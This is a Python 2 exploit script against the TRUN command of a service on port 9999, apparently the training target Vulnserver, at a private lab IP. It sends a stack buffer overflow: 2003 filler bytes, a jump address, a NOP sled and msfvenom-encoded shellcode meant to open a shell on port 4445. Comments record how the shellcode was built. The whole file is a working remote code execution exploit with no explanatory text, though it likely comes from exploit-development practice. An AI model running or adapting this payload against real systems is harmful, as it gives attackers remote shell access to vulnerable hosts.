import socket
import struct

print "\nTRUN Command - Open port 4445\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)

    # ./compile.sh firewall_4445 
    # perl -e 'print "<shellcode>"' > firewall_4445.bin 
    # cat firewall_4445.bin | msfvenom -b '\x00'
    buf = (
    "\xbe\x3e\x2c\xda\xe6\xda\xdc\xd9\x74\x24\xf4\x58\x29\xc9"
    "\xb1\x42\x83\xc0\x04\x31\x70\x0f\x03\x70\x31\xce\x2f\xd7"
    "\x9f\x87\x37\x91\x08\x19\x5b\xb2\x36\x19\xa4\xdb\x5f\x6a"
    "\xd0\x1b\xf7\xf8\x6b\x40\x4b\x69\xe2\x28\x3c\x1b\x92\xb1"
    "\x8d\xab\x07\x2a\x73\x2d\xa4\xc6\x1b\xf1\x73\x7b\xb4\x61"
    "\x1a\xea\x26\x17\x8a\x88\xe6\xa5\x25\x39\x68\x2e\xdb\xcb"
    "\x1c\xf2\x48\x58\xbd\x62\x03\xc9\x5e\x0a\xb3\x65\xcc\x9c"
    "\x2c\x1e\x7e\x38\xc4\xbf\x16\xb1\x76\x06\x8f\x5d\xe2\xf2"
    "\x2a\xec\x84\x9b\xc6\x71\x38\x34\x55\x01\x9e\x94\xf1\xa4"
    "\x7d\x76\x64\x4f\xe3\x0a\x03\xeb\x8b\x99\x97\xa0\x23\x36"
    "\x51\x2e\xd7\xa3\xf5\xec\x44\x49\x77\x65\x07\xc2\x12\x01"
    "\xbf\x8a\xa8\x9b\x50\x3b\x3e\x28\xec\xd4\xd6\xa5\x80\x58"
    "\x43\x2e\x20\xd0\xd7\xed\xc2\xb9\xbe\xa2\x46\xb7\xa2\x74"
    "\xa7\x97\x75\x27\x4f\x27\x79\xc8\x8f\x07\x29\x86\xdd\xcf"
    "\xcb\x26\xe2\x8f\x73\xc2\x0b\x52\xf4\xf4\x1c\x5c\x28\x58"
    "\xf5\xa5\x98\x1e\x55\xb2\x14\x95\x61\x77\xdd\x37\xb8\xbe"
    "\x8c\xdf\xde\x33\x5a\x20\x49\xd1\xc6\x1a\xfd\x71\x68\x3a"
    "\x9f\xed\x1c\x86\x75\xd4\x99\x9e\xb3\x7c\x62\x0f\xac\x48"
    "\x50\x9b\x19\x38\x79\xd2\xa1\x7a\x11\x0d\x22\x7b\xe1\x7c"
    "\x72\x33\xb1\x2c\x8d\xf4\x89\x06\x9b\x26\x9e\x57\x8c\x26"
    "\x57\x10\x3a\xb5\x4a\x17\xba\x95")
    
    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(evil_buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
